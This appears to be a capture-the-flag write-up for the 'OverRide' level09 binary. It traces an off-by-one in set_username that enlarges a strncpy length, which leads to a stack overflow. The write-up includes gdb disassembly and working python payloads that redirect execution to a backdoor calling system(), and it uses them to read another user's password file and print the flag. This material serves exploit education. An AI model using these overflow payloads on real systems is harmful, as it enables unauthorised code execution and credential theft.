We can see that NX and PIE are enabled, and this time we are on 64 bits. With PIE active, 
it is generally a sign that ASLR is active; however, we can see that it is not:

```bash
level09@OverRide:~$ cat /proc/sys/kernel/randomize_va_space
0
```
see for more informations for PIE and ASLR:
- https://connect.ed-diamond.com/MISC/misc-062/la-securite-applicative-sous-linux
- https://lettieri.iet.unipi.it/hacking/aslr-pie.pdf


Similarly for NX, it doesn't change much since there is already a function that allows using `system()` 
with the command of our choice without needing to use a shellcode or a ret2libc:

```C
int secret_backdoor()
{
  char s[128];

  fgets(s, 128, stdin);
  return system(s);
}
```

By testing various inputs, we quickly notice different behavior starting 
from the 40th character in the username, like a newline who disapeared:

```bash
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: ABCD 
>: Welcome, ABCD
>: Msg @Unix-Dude
>>: salut
>: Msg sent!
level09@OverRide:~$ ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: 01234567890123456789012345678901234567890123456789012345678901234567890123456789
>: Welcome, 01234567890123456789012345678901234567890>: Msg @Unix-Dude
>>: salut
>: Msg sent!
```

Let's start by analyzing the decompiled source code.

Here is a basic main function that calls `handle_msg()`:
```C
int main(int argc, char** argv, char** envp)
{
    puts(
    "--------------------------------------------\n"
    "|   ~Welcome to l33t-m$n ~    v1337        |\n"
    "--------------------------------------------");
    handle_msg();
    return 0;
}
```

The `handle_msg()` function prepares a buffer[140] followed by another memory space of 
40 characters and finally an integer with the value 140:
```C
int handle_msg()
{
  char buffer[140];
  __int64_t v2;
  __int64_t v3;
  __int64_t v4;
  __int64_t v5;
  __int64_t v6;
  int v7 = 140;

  //memset of 40 bytes
  v2 = 0LL;
  v3 = 0LL;
  v4 = 0LL;
  v5 = 0LL;
  v6 = 0LL;

  set_username((__int64_t)buffer);
  set_msg((__int64_t)buffer);
  return puts(">: Msg sent!");
}
```
Decompilers struggle a bit with this part of the code, so let's see what it looks like in assembly:

```nasm
Breakpoint 1, 0x00005555555548c4 in handle_msg ()
(gdb) disass
Dump of assembler code for function handle_msg:
   0x00005555555548c0 <+0>:	push   %rbp
   0x00005555555548c1 <+1>:	mov    %rsp,%rbp
=> 0x00005555555548c4 <+4>:	sub    $0xc0,%rsp
   0x00005555555548cb <+11>:	lea    -0xc0(%rbp),%rax ;-192
   0x00005555555548d2 <+18>:	add    $0x8c,%rax
   0x00005555555548d8 <+24>:	movq   $0x0,(%rax)
   0x00005555555548df <+31>:	movq   $0x0,0x8(%rax)
   0x00005555555548e7 <+39>:	movq   $0x0,0x10(%rax)
   0x00005555555548ef <+47>:	movq   $0x0,0x18(%rax)
   0x00005555555548f7 <+55>:	movq   $0x0,0x20(%rax)
   0x00005555555548ff <+63>:	movl   $0x8c,-0xc(%rbp) ; move long (140) rbp - 12
   0x0000555555554906 <+70>:	lea    -0xc0(%rbp),%rax
   0x000055555555490d <+77>:	mov    %rax,%rdi
   0x0000555555554910 <+80>:	callq  0x5555555549cd <set_username>
   0x0000555555554915 <+85>:	lea    -0xc0(%rbp),%rax
   0x000055555555491c <+92>:	mov    %rax,%rdi
   0x000055555555491f <+95>:	callq  0x555555554932 <set_msg>
   0x0000555555554924 <+100>:	lea    0x295(%rip),%rdi        # 0x555555554bc0
   0x000055555555492b <+107>:	callq  0x555555554730 <puts@plt>
   0x0000555555554930 <+112>:	leaveq 
   0x0000555555554931 <+113>:	retq

...

(gdb) i r
...
rbp            0x7fffffffe5d0	0x7fffffffe5d0
rsp            0x7fffffffe510	0x7fffffffe510
```
We can observe the initialization of a 192-byte stack frame.

`rbp` is at `0x7fffffffe5d0` and `rsp` is at `0x7fffffffe510`, which is 192 bytes apart.

`RAX` gets the address of `RSP`, and 140 bytes later, zeros are added to 40 bytes
of (%rax) to (%rax)+0x28 using some `movq` instructions.

Finally, the value `140` is added to `RBP-12`.

So, **there is actually a memory space of 180 bytes followed by an integer indicating a size of 140**.

Let's take a closer look at the `set_username()` and `set_msg()` functions.

In `set_username`, we find this loop that explains why there was no newline character with more 
than 41 characters in the initial input tests:

```C
fgets(s, 128, stdin);
for (i = 0; i <= 40 && s[i]; ++i)
    *(_BYTE *)(buffer + i + 140) = s[i];
  return printf(">: Welcome, %s", (const char *)(buffer + 140));
```

`fgets()` retrieves 128 characters from stdin and stores them in `s`.

Then, the `for` loop copies 41 characters into the buffer, starting from `buffer+140`, which is 
the location of the 40 bytes that were set to 0.

However, in the `set_msg()` function, we can see the use of `strncpy()` from the message to the buffer, 
with the memory space (cast to int) located at `buffer+180`. So, one extra character was retrieved previously:

```C
fgets(s, 1024, stdin);
  return strncpy((char *)buffer, s, *(int *)(buffer + 180));
```

This means that the 41st character likely modifies the variable used for the strncpy size, 
at `RBP-0xc`, which could allow overflowing the buffer and thus overwriting RIP in `handle_msg()` !

Let's quickly test it:
```bash
level09@OverRide:~$ python -c 'print "A" * 40 + "\xff" + "A" * 300' | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
```
It works!

After some trials, we easily find the offset for RIP, which is 286:
```bash
level09@OverRide:~$ python -c 'print "run\n" + "A" * 40 + "\xff" + "A" * 287' | gdb ./level09 
...
(gdb) Starting program: /home/users/level09/level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000a41 in ?? ()
(gdb) quit
A debugging session is active.

	Inferior 1 [process 2401] will be killed.

Quit anyway? (y or n) [answered Y; input not from terminal]
```

We can see the beginning of RIP being rewritten with the 'A' and a newline character in the second position.

Now, we can retrieve the address of `secret_backdoor()`:
```nasm
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) r
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) p secret_backdoor
$2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

We found `0x000055555555488c`.

Note that it is necessary to run the executable to retrieve it, we cannot use objdump since PIE is enabled. However, 
there is no need for it because ASLR is not enabled on the system, the address is not randomized.

Let's test it with this payload:
```bash
level09@OverRide:~$ python -c 'print "run\n" + "A" * 40 + "\xff" + "A" * 286 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "echo salut"' | gdb ./level09 
...
(gdb) Starting program: /home/users/level09/level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
salut

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()
```

A shell has been opened at the end, so we successfully redirected RIP to `secret_backdoor()` !

Now, let's test it outside of GDB and add `cat /home/users/end/.pass` as input for `system()`:
```bash
level09@OverRide:~$ python -c 'print "A" * 40 + "\xff" + "A" * 286 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "cat /home/users/end/.pass"' | ./level09 
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```

And there we have the last flag!

In the home directory of the `end` user, we find a file indicating:
```bash
end@OverRide:~$ cat end
GG !
```
